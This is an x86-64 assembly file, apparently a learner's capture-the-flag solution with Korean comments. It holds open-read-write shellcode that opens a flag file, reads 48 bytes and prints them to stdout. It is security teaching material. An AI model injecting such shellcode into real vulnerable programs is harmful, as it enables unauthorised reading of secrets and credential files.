;Name: shell_basic.S

push 0x0
mov rax, 0x676e6f6f6f6f6f6f ; oooooong
push rax
mov rax, 0x6c5f73695f656d61 ; ame_is_l
push rax
mov rax, 0x6e5f67616c662f63 ; c/flag_n
push rax
mov rax, 0x697361625f6c6c65 ; ell_basi
push rax
mov rax, 0x68732f656d6f682f ; /home/sh
push rax

mov rdi, rsp ; rdi = "/home/shell_basic/flag_name_is_loooooong"
             ; rdi 레지스터에 스택의 현재 위치 저장: 파일 경로의 시작 주소를 가리킴
xor rsi, rsi ; rsi = NULL -> 원하는 작업 전 약간 초기화해주는 느낌
xor rdx, rdx ; rdx = NULL
mov rax, 0x2 ; rax = sys_open -> 시스템콜 번호가 2임
syscall ; open("/home/shell_basic/flag_name_is_loooooong", NULL, NULL)
        ; (rdi에 저장된 파일 경로)를 열고자 함

mov rdi, rax ; rdi = open("/home/shell_basic/flag_name_is_loooooong", NULL, NULL)
mov rsi, rsp
sub rsi, 0x30 ; rsi = buf -> 파일에서 읽은 데이터를 저장할 버퍼의 시작 주소 설정
mov rdx, 0x30 ; rdx = 0x30 -> 읽을 바이트 수 설정(48바이트)
mov rax, 0x0 ; rax = sys_read
syscall ; read(fd, buf, 0x30)

mov rdi, 0x1 ; rdi = 0x1 (stdout) -> 표준 출력 파일 디스크립터
mov rax, 0x1 ; rax = sys_write
syscall ; write(1, buf, 0x30)
